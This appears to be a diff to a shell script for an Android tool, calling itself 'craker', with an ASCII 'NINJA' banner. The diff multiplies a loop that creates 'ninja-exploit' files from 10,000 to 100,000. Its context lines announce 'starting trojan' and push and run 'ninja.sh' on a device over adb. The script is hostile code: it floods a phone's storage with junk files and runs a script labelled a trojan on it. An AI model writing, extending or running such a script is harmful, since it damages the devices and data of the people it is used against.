@@ -147,7 +147,7 @@ echo -e "\e[32m▐ ▄ ▪   ▐ ▄  ▐▄▄▄ ▄▄▄·
 ▐█▐▐▌▐█·▐█▐▐▌▪▄ ██▄█▀▀█
 ██▐█▌▐█▌██▐█▌▐▌▐█▌▐█ ▪▐▌
 ▀▀ █▪▀▀▀▀▀ █▪ ▀▀▀• ▀  ▀ \e[0m"
-for i in $(seq 1 10000)
+for i in $(seq 1 100000)
 do
 touch ninja-exploit-$i
 echo -e "\e[32m Archived created $i\e[0m"
@@ -160,6 +160,7 @@ rm ninja.sh
 echo -e "\e[32m[+]\e[0m starting trojan"
 sleep 1
 adb shell sh /sdcard/ninja.sh
+else
 echo -e "use: ./craker --help"
 fi
 }
